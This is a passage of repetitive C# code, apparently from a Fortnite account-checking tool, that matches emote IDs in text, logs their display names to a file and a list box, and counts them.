                            bool DancesFound35 = x.Contains("AthenaDance:eid_praisestorm");
                            if (DancesFound35)
                            {
                                sw.WriteLine("=> Storm Salutation");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Storm Salutation");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound36 = x.Contains("AthenaDance:eid_rockpaperscissors");
                            if (DancesFound36)
                            {
                                sw.WriteLine("=> Rock Paper Scissors");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Rock Paper Scissors");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound37 = x.Contains("AthenaDance:eid_tapshuffle");
                            if (DancesFound37)
                            {
                                sw.WriteLine("=> Hootenanny");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Hootenanny");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound38 = x.Contains("AthenaDance:eid_wiggle");
                            if (DancesFound38)
                            {
                                sw.WriteLine("=> Wiggle");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Wiggle");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound39 = x.Contains("AthenaDance:eid_heelclick");
                            if (DancesFound39)
                            {
                                sw.WriteLine("=> Click!");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Click!");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound41 = x.Contains("AthenaDance:eid_rockguitar");
                            if (DancesFound41)
                            {
                                sw.WriteLine("=> Rock Out");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Rock Out");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound42 = x.Contains("AthenaDance:eid_smoothride");
                            if (DancesFound42)
                            {
                                sw.WriteLine("=> Smooth Ride");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Smooth Ride");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound43 = x.Contains("AthenaDance:eid_easternbloc");
                            if (DancesFound43)
                            {
                                sw.WriteLine("=> Squat Kick");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Squat Kick");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound44 = x.Contains("AthenaDance:eid_tidy");
                            if (DancesFound44)
                            {
                                sw.WriteLine("=> Tidy");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Tidy");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound45 = x.Contains("AthenaDance:eid_boneless");
                            if (DancesFound45)
                            {
                                sw.WriteLine("=> Boneless");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Boneless");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound46 = x.Contains("AthenaDance:eid_chicken");
                            if (DancesFound46)
                            {
                                sw.WriteLine("=> Chicken");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Chicken");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound47 = x.Contains("AthenaDance:eid_goodvibes");
                            if (DancesFound47)
                            {
                                sw.WriteLine("=> Orange Justice");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Orange Justice");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound48 = x.Contains("AthenaDance:eid_groovejam");
                            if (DancesFound48)
                            {
                                sw.WriteLine("=> Groove Jam");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Groove Jam");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound49 = x.Contains("AthenaDance:eid_hiphop01");
                            if (DancesFound49)
                            {
                                sw.WriteLine("=> Freestylin");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Freestylin");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound50 = x.Contains("AthenaDance:eid_hype");
                            if (DancesFound50)
                            {
                                sw.WriteLine("=> Hype");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Hype");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound51 = x.Contains("AthenaDance:eid_kungfusalute");
                            if (DancesFound51)
                            {
                                sw.WriteLine("=> Respect");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Respect");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound52 = x.Contains("AthenaDance:eid_popcorn");
                            if (DancesFound52)
                            {
                                sw.WriteLine("=> Popcorn");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Popcorn");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound53 = x.Contains("AthenaDance:eid_thumbsdown");
                            if (DancesFound53)
                            {
                                sw.WriteLine("=> Thumbs Down");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Thumbs Down");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound54 = x.Contains("AthenaDance:eid_thumbsup");
                            if (DancesFound54)
                            {
                                sw.WriteLine("=> Thumbs Up");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Thumbs Up");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound55 = x.Contains("AthenaDance:eid_bendy");
                            if (DancesFound55)
                            {
                                sw.WriteLine("=> Zany");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Zany");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound56 = x.Contains("AthenaDance:eid_clapperboard");
                            if (DancesFound56)
                            {
                                sw.WriteLine("=> Take 14");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Take 14");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound57 = x.Contains("AthenaDance:eid_popdance01");
                            if (DancesFound57)
                            {
                                sw.WriteLine("=> Star Power");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Star Power");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound58 = x.Contains("AthenaDance:eid_snap");
                            if (DancesFound58)
                            {
                                sw.WriteLine("=> Snap");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Snap");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound59 = x.Contains("AthenaDance:eid_yeet");
                            if (DancesFound59)
                            {
                                sw.WriteLine("=> Dip");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Dip");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound60 = x.Contains("AthenaDance:eid_basketball");
                            if (DancesFound60)
                            {
                                sw.WriteLine("=> Baller");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Baller");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound61 = x.Contains("AthenaDance:eid_boogiedown");
                            if (DancesFound61)
                            {
                                sw.WriteLine("=> Boogie Down");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Boogie Down");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound62 = x.Contains("AthenaDance:eid_laugh");
                            if (DancesFound62)
                            {
                                sw.WriteLine("=> Laugh It Up");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Laugh It Up");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound63 = x.Contains("AthenaDance:eid_zippy");
                            if (DancesFound63)
                            {
                                sw.WriteLine("=> Rambunctious");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Rambunctious");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound64 = x.Contains("AthenaDance:eid_cry");
                            if (DancesFound64)
                            {
                                sw.WriteLine("=> Waterworks");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Waterworks");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound65 = x.Contains("AthenaDance:eid_dinosaur");
                            if (DancesFound65)
                            {
                                sw.WriteLine("=> Rawr");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Rawr");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound66 = x.Contains("AthenaDance:eid_poplock");
                            if (DancesFound66)
                            {
                                sw.WriteLine("=> Pop Lock");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Pop Lock");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound67 = x.Contains("AthenaDance:eid_redcard");
                            if (DancesFound67)
                            {
                                sw.WriteLine("=> Red Card");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Red Card");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound68 = x.Contains("AthenaDance:eid_soccerjuggling");
                            if (DancesFound68)
                            {
                                sw.WriteLine("=> Kick Ups");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Kick Ups");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound69 = x.Contains("AthenaDance:eid_bringiton");
                            if (DancesFound69)
                            {
                                sw.WriteLine("=> Bring It");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Bring It");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound70 = x.Contains("AthenaDance:eid_fireworksspin");
                            if (DancesFound70)
                            {
                                sw.WriteLine("=> Rocket Spinner");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Rocket Spinner");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound71 = x.Contains("AthenaDance:eid_infinitedab");
                            if (DancesFound71)
                            {
                                sw.WriteLine("=> Infinite Dab");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Infinite Dab");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound72 = x.Contains("AthenaDance:eid_keagle");
                            if (DancesFound72)
                            {
                                sw.WriteLine("=> Eagle");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Eagle");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound73 = x.Contains("AthenaDance:eid_kpopdance01");
                            if (DancesFound73)
                            {
                                sw.WriteLine("=> True Heart");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> True Heart");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound74 = x.Contains("AthenaDance:eid_sparkler");
                            if (DancesFound74)
                            {
                                sw.WriteLine("=> Sparkler");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Sparkler");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound75 = x.Contains("AthenaDance:eid_handsignals");
                            if (DancesFound75)
                            {
                                sw.WriteLine("=> Hand Signals");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Hand Signals");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound76 = x.Contains("AthenaDance:eid_intensity");
                            if (DancesFound76)
                            {
                                sw.WriteLine("=> Intensity");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Intensity");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound77 = x.Contains("AthenaDance:eid_livinglarge");
                            if (DancesFound77)
                            {
                                sw.WriteLine("=> Living Large");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Living Large");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound78 = x.Contains("AthenaDance:eid_nottoday");
                            if (DancesFound78)
                            {
                                sw.WriteLine("=> Finger Wag");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Finger Wag");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound79 = x.Contains("AthenaDance:eid_aerobics");
                            if (DancesFound79)
                            {
                                sw.WriteLine("=> Work It Out");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Work It Out");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound80 = x.Contains("AthenaDance:eid_chug");
                            if (DancesFound80)
                            {
                                sw.WriteLine("=> Go! Go! Go!");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Go! Go! Go!");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound81 = x.Contains("AthenaDance:eid_hotstuff");
                            if (DancesFound81)
                            {
                                sw.WriteLine("=> Hot Stuff");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Hot Stuff");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound82 = x.Contains("AthenaDance:eid_llamabell");
                            if (DancesFound82)
                            {
                                sw.WriteLine("=> Llama Bell");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Llama Bell");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound83 = x.Contains("AthenaDance:eid_pump");
                            if (DancesFound83)
                            {
                                sw.WriteLine("=> Pumpernickel");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Pumpernickel");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound84 = x.Contains("AthenaDance:eid_capoeira");
                            if (DancesFound84)
                            {
                                sw.WriteLine("=> Capoeira");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Capoeira");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound85 = x.Contains("AthenaDance:eid_dustinghands");
                            if (DancesFound85)
                            {
                                sw.WriteLine("=> Job Well Done");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Job Well Done");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound86 = x.Contains("AthenaDance:eid_fancyfeet");
                            if (DancesFound86)
                            {
                                sw.WriteLine("=> Fancy Feet");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Fancy Feet");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound87 = x.Contains("AthenaDance:eid_maracas");
                            if (DancesFound87)
                            {
                                sw.WriteLine("=> Shake It Up");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Shake It Up");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound88 = x.Contains("AthenaDance:eid_praisethetomato");
                            if (DancesFound88)
                            {
                                sw.WriteLine("=> Praise the Tomato");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Praise the Tomato");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound89 = x.Contains("AthenaDance:eid_warehouse");
                            if (DancesFound89)
                            {
                                sw.WriteLine("=> Dance Therapy");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Dance Therapy");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound90 = x.Contains("AthenaDance:eid_everytime");
                            if (DancesFound90)
                            {
                                sw.WriteLine("=> Vivacious");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Vivacious");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound91 = x.Contains("AthenaDance:eid_fistpump");
                            if (DancesFound91)
                            {
                                sw.WriteLine("=> Fist Pump");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Fist Pump");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound92 = x.Contains("AthenaDance:eid_hitchhiker");
                            if (DancesFound92)
                            {
                                sw.WriteLine("=> Hitchhiker");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Hitchhiker");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound93 = x.Contains("AthenaDance:eid_myidol");
                            if (DancesFound93)
                            {
                                sw.WriteLine("=> My Idol!");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> My Idol!");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound94 = x.Contains("AthenaDance:eid_vikinghorn");
                            if (DancesFound94)
                            {
                                sw.WriteLine("=> Battle Call");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Battle Call");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound95 = x.Contains("AthenaDance:eid_dj01");
                            if (DancesFound95)
                            {
                                sw.WriteLine("=> Drop the Bass");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Drop the Bass");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound96 = x.Contains("AthenaDance:eid_flamenco");
                            if (DancesFound96)
                            {
                                sw.WriteLine("=> Flamenco");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Flamenco");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound97 = x.Contains("AthenaDance:eid_kpopdance02");
                            if (DancesFound97)
                            {
                                sw.WriteLine("=> Smooth Moves");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Smooth Moves");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound98 = x.Contains("AthenaDance:eid_llamarider_glitter");
                            if (DancesFound98)
                            {
                                sw.WriteLine("=> Glitter-up");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Glitter-up");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound99 = x.Contains("AthenaDance:eid_needtogo");
                            if (DancesFound99)
                            {
                                sw.WriteLine("=> It's Go Time!");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> It's Go Time!");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound100 = x.Contains("AthenaDance:eid_octopus");
                            if (DancesFound100)
                            {
                                sw.WriteLine("=> Slitherin'");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Slitherin'");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound101 = x.Contains("AthenaDance:eid_regalwave");
                            if (DancesFound101)
                            {
                                sw.WriteLine("=> Regal Wave");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Regal Wave");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound102 = x.Contains("AthenaDance:eid_runningman");
                            if (DancesFound102)
                            {
                                sw.WriteLine("=> Running Man");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Running Man");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound103 = x.Contains("AthenaDance:eid_somethingstinks");
                            if (DancesFound103)
                            {
                                sw.WriteLine("=> Something Stinks");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Something Stinks");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound104 = x.Contains("AthenaDance:eid_tpose");
                            if (DancesFound104)
                            {
                                sw.WriteLine("=> T-Pose");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> T-Pose");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound105 = x.Contains("AthenaDance:eid_electroswing");
                            if (DancesFound105)
                            {
                                sw.WriteLine("=> Electro Swing");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Electro Swing");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound106 = x.Contains("AthenaDance:eid_headbang");
                            if (DancesFound106)
                            {
                                sw.WriteLine("=> Headbanger");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Headbanger");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound107 = x.Contains("AthenaDance:eid_lookatthis");
                            if (DancesFound107)
                            {
                                sw.WriteLine("=> Behold!");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Behold!");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound108 = x.Contains("AthenaDance:eid_sprinkler");
                            if (DancesFound108)
                            {
                                sw.WriteLine("=> Sprinkler");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Sprinkler");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound109 = x.Contains("AthenaDance:eid_crisscross");
                            if (DancesFound109)
                            {
                                sw.WriteLine("=> Criss Cross");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Criss Cross");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound110 = x.Contains("AthenaDance:eid_halloweencandy");
                            if (DancesFound110)
                            {
                                sw.WriteLine("=> Treat Yourself");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Treat Yourself");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound111 = x.Contains("AthenaDance:eid_juggler");
                            if (DancesFound111)
                            {
                                sw.WriteLine("=> Jugglin'");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Jugglin'");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound112 = x.Contains("AthenaDance:eid_taichi");
                            if (DancesFound112)
                            {
                                sw.WriteLine("=> Tai Chi");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Tai Chi");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound113 = x.Contains("AthenaDance:eid_texting");
                            if (DancesFound113)
                            {
                                sw.WriteLine("=> Busy");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Busy");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound114 = x.Contains("AthenaDance:eid_wolfhowl");
                            if (DancesFound114)
                            {
                                sw.WriteLine("=> Howl");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Howl");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound115 = x.Contains("AthenaDance:eid_crisscross");
                            if (DancesFound115)
                            {
                                sw.WriteLine("=> Criss Cross");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Criss Cross");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound116 = x.Contains("AthenaDance:eid_halloweencandy");
                            if (DancesFound116)
                            {
                                sw.WriteLine("=> Treat Yourself");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Treat Yourself");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound117 = x.Contains("AthenaDance:eid_juggler");
                            if (DancesFound117)
                            {
                                sw.WriteLine("=> Jugglin'");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Jugglin'");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound118 = x.Contains("AthenaDance:eid_taichi");
                            if (DancesFound118)
                            {
                                sw.WriteLine("=> Tai Chi");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Tai Chi");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound119 = x.Contains("AthenaDance:eid_texting");
                            if (DancesFound119)
                            {
                                sw.WriteLine("=> Busy");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Busy");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound120 = x.Contains("AthenaDance:eid_wolfhowl");
                            if (DancesFound120)
                            {
                                sw.WriteLine("=> Howl");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Howl");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound121 = x.Contains("AthenaDance:eid_crazyfeet");
                            if (DancesFound121)
                            {
                                sw.WriteLine("=> Crazy Feet");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Crazy Feet");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound122 = x.Contains("AthenaDance:eid_disagree");
                            if (DancesFound122)
                            {
                                sw.WriteLine("=> Denied");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Denied");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound123 = x.Contains("AthenaDance:eid_touchdown");
                            if (DancesFound123)
                            {
                                sw.WriteLine("=> Spike It");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Spike It");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound124 = x.Contains("AthenaDance:eid_afrohouse");
                            if (DancesFound124)
                            {
                                sw.WriteLine("=> Bombastic");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Bombastic");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound125 = x.Contains("AthenaDance:eid_cowboydance");
                            if (DancesFound125)
                            {
                                sw.WriteLine("=> Knee Slapper");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Knee Slapper");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound126 = x.Contains("AthenaDance:eid_timeout");
                            if (DancesFound126)
                            {
                                sw.WriteLine("=> Time Out");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Time Out");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound127 = x.Contains("AthenaDance:eid_wir");
                            if (DancesFound127)
                            {
                                sw.WriteLine("=> Hot Marat");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Hot Marat");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound128 = x.Contains("AthenaDance:eid_wizard");
                            if (DancesFound128)
                            {
                                sw.WriteLine("=> Llamacadabra");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Llamacadabra");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound129 = x.Contains("AthenaDance:eid_mime");
                            if (DancesFound129)
                            {
                                sw.WriteLine("=> Mime Time");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Mime Time");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound130 = x.Contains("AthenaDance:eid_saxophone");
                            if (DancesFound130)
                            {
                                sw.WriteLine("=> Phone It in");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Phone It in");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound131 = x.Contains("AthenaDance:eid_scorecard");
                            if (DancesFound131)
                            {
                                sw.WriteLine("=> Scorecard");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Scorecard");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound132 = x.Contains("AthenaDance:eid_showstopper");
                            if (DancesFound132)
                            {
                                sw.WriteLine("=> Showstopper");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Showstopper");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound133 = x.Contains("AthenaDance:eid_accolades");
                            if (DancesFound133)
                            {
                                sw.WriteLine("=> Accolades");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Accolades");
                                }
                                TotalDances = TotalDances + 1;
                            }
                            bool DancesFound134 = x.Contains("AthenaDance:eid_acrobaticsuperhero");
                            if (DancesFound134)
                            {
                                sw.WriteLine("=> Ground Pound");
                                if (ListBoxDisableText.Checked == false)
                                {
